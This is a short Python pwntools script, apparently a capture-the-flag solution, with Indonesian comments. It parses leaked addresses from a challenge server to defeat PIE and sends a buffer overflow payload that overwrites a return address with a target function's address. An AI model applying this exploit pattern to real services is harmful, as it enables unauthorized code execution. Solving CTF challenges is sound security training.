import re
from pwn import *

host = 'ctf99x.cs.ui.ac.id'
port = 20002


r = remote(host, port)

# Langkah 1: Dapatkan alamat leak() dan nanikore
r.sendline(b'1')
r.recvuntil(b'> ')
leak_output = r.recvline().decode()
print(leak_output)
leak_address, nanikore_address = [int(x, 16) for x in re.findall('0x[0-9a-fA-F]+', leak_output)]
print('leak_address: 0x{:x}'.format(leak_address))
print('nanikore_address: 0x{:x}'.format(nanikore_address))

relative_address = 0x8dd
# Langkah 2: Hitung offset
offset = leak_address - relative_address
print('leak_address: 0x{:x}'.format(leak_address))
print('offset: 0x{:x}'.format(offset))

# Langkah 3: Eksploitasi buffer overflow
onegaishimasu_address = offset + 0x89a
r.sendline(b'2')
payload = b'A' * 8*9 + p64(onegaishimasu_address)
r.sendline(payload)
print(payload)

# Kirim payload ke server
r.sendline(payload)

print(r.recvall().decode())

# Tutup koneksi
r.close()